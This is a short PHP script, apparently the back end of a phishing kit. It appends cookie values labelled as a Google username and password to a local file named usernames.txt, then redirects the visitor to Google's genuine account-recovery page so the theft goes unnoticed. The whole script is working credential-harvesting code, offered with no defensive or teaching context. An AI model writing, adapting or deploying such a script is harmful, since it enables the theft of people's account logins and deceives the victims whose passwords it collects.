<?php
file_put_contents("usernames.txt", "Google Username: " . $_COOKIE['user'] . "\nPassword: " . $_COOKIE['pass'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
?>